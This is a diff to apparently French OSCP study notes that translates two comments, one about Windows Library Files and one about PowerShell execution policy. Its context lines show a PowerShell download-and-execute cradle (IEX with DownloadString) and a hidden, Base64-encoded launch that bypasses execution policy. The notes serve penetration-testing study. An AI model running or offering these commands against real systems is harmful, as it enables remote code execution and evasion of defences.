@@ -145,7 +145,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 `.Library-ms`  
 
 
-<p class="oscp-command-note">Extrait XML lié à « Windows Library Files ».</p>
+<p class="oscp-command-note">Exemple de structure XML d’un fichier de bibliothèque Windows (`.library-ms`).</p>
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -234,7 +234,7 @@ $text = "[Your PowerShell Command]"
 $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
 Write-Output $encoded
 
-# Altering PowerShell Execution Policies
+# Modification de la politique d'exécution PowerShell
 powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
 
 ```
